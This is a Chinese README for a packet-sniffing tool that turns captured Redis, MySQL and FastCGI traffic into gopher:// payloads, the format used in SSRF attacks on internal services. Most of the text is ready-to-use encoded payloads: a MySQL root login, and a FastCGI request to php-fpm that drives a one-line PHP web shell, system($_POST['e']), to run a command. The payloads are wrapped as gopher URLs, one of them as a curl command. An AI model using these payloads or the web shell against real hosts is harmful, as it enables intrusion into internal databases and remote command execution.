### 原理
gopher协议是个tcp/ip协议，通过gopher协议可以发送tcp stream，payload使用%+16进制编码，其实原理比较简单，平时自己用tcpdump或者wireshark把stream一段段复制出来就行，但是这样在使用的时候发现很容易出错，出现错误很难排查，而且对着一大段16进制特别头晕，于是就有了此工具，直接打印出可以复制粘贴的payload，此工具通过网卡流量解析出tcp stream，转换为gopher的payload

### 使用
测试redis e.g.
首先我们使用命令./sniffer -p6379 监听网卡，然后需要本地搭建redis服务，使用客户端去连接，并执行info命令，然后断开，打印如下payload
```
%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a
```
然后加上gopher协议格式gopher:/ip:port/_ + payload就是最终payload
```
curl 'gopher://127.0.0.1:6379/_%2a%31%0d%0a%24%37%0d%0a%43%4f%4d%4d%41%4e%44%0d%0a%2a%31%0d%0a%24%34%0d%0a%69%6e%66%6f%0d%0a'
```

测试mysql e.g.
首先我们使用命令./sniffer -p3306 监听网卡，然后需要本地搭建msyql服务，执行如下命令测试
```
mysql -h 127.0.0.1 -u root -e "use information_schema;show tables;"
```
得到payload
```
%bb%00%00%01%84%a2%9f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%07%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%7e%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%0a%6c%69%62%6d%61%72%69%61%64%62%04%5f%70%69%64%05%33%31%31%34%33%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%05%33%2e%30%2e%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%5f%73%65%72%76%65%72%5f%68%6f%73%74%09%31%32%37%2e%30%2e%30%2e%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%13%00%00%00%02%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%01%00%00%00%01
```
然后加上gopher协议格式gopher:/ip:port/_ + payload就是最终payload

```
gopher:/127.0.0.1:3306/_%bb%00%00%01%84%a2%9f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%07%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%7e%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%0a%6c%69%62%6d%61%72%69%61%64%62%04%5f%70%69%64%05%33%31%30%34%32%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%05%33%2e%30%2e%37%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%5f%73%65%72%76%65%72%5f%68%6f%73%74%09%31%32%37%2e%30%2e%30%2e%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%13%00%00%00%02%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%0c%00%00%00%03%73%68%6f%77%20%74%61%62%6c%65%73%01%00%00%00%01
```

测试fastcgi e.g.
首先我们使用./sniffer -p9000监听网卡，启动php-fpm服务监听到9000端口, 然后使用https://github.com/wuyunfeng/Python-FastCGI-Client 客户端模拟fastcgi请求，执行如下命令测试

```
python fcgi.py http://127.0.0.1:9000 /home/firebroo/test/1.php e=id
```

我的/home/firebroo/test/1.php内容为<?php system($_POST['e']);?>

得到payload
```
%01%01%35%67%00%08%00%00%00%01%00%00%00%00%00%00%01%04%35%67%01%86%00%00%0e%01%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%34%0c%21%43%4f%4e%54%45%4e%54%5f%54%59%50%45%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0b%04%52%45%4d%4f%54%45%5f%50%4f%52%54%39%39%38%35%0b%09%53%45%52%56%45%52%5f%4e%41%4d%45%6c%6f%63%61%6c%68%6f%73%74%11%0b%47%41%54%45%57%41%59%5f%49%4e%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2f%31%2e%30%0f%0e%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%70%68%70%2f%66%63%67%69%63%6c%69%65%6e%74%0b%09%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0f%19%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%68%6f%6d%65%2f%66%69%72%65%62%72%6f%6f%2f%74%65%73%74%2f%31%2e%70%68%70%0b%00%53%43%52%49%50%54%5f%4e%41%4d%45%0e%04%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%0b%02%53%45%52%56%45%52%5f%50%4f%52%54%38%30%0f%08%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%0c%00%51%55%45%52%59%5f%53%54%52%49%4e%47%0d%19%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%68%6f%6d%65%2f%66%69%72%65%62%72%6f%6f%2f%74%65%73%74%2f%31%2e%70%68%70%0b%09%53%45%52%56%45%52%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%00%52%45%51%55%45%53%54%5f%55%52%49%01%04%35%67%00%00%00%00%01%05%35%67%00%04%00%00%65%3d%69%64%01%05%35%67%00%00%00%00
```

然后加上gopher协议格式gopher:/ip:port/_ + payload就是最终payload

```
gopher://127.0.0.1:9000/_%01%01%35%67%00%08%00%00%00%01%00%00%00%00%00%00%01%04%35%67%01%86%00%00%0e%01%43%4f%4e%54%45%4e%54%5f%4c%45%4e%47%54%48%34%0c%21%43%4f%4e%54%45%4e%54%5f%54%59%50%45%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%0b%04%52%45%4d%4f%54%45%5f%50%4f%52%54%39%39%38%35%0b%09%53%45%52%56%45%52%5f%4e%41%4d%45%6c%6f%63%61%6c%68%6f%73%74%11%0b%47%41%54%45%57%41%59%5f%49%4e%54%45%52%46%41%43%45%46%61%73%74%43%47%49%2f%31%2e%30%0f%0e%53%45%52%56%45%52%5f%53%4f%46%54%57%41%52%45%70%68%70%2f%66%63%67%69%63%6c%69%65%6e%74%0b%09%52%45%4d%4f%54%45%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0f%19%53%43%52%49%50%54%5f%46%49%4c%45%4e%41%4d%45%2f%68%6f%6d%65%2f%66%69%72%65%62%72%6f%6f%2f%74%65%73%74%2f%31%2e%70%68%70%0b%00%53%43%52%49%50%54%5f%4e%41%4d%45%0e%04%52%45%51%55%45%53%54%5f%4d%45%54%48%4f%44%50%4f%53%54%0b%02%53%45%52%56%45%52%5f%50%4f%52%54%38%30%0f%08%53%45%52%56%45%52%5f%50%52%4f%54%4f%43%4f%4c%48%54%54%50%2f%31%2e%31%0c%00%51%55%45%52%59%5f%53%54%52%49%4e%47%0d%19%44%4f%43%55%4d%45%4e%54%5f%52%4f%4f%54%2f%68%6f%6d%65%2f%66%69%72%65%62%72%6f%6f%2f%74%65%73%74%2f%31%2e%70%68%70%0b%09%53%45%52%56%45%52%5f%41%44%44%52%31%32%37%2e%30%2e%30%2e%31%0b%00%52%45%51%55%45%53%54%5f%55%52%49%01%04%35%67%00%00%00%00%01%05%35%67%00%04%00%00%65%3d%69%64%01%05%35%67%00%00%00%00
```

其它协议都可以支持，只要是一次性请求就行～～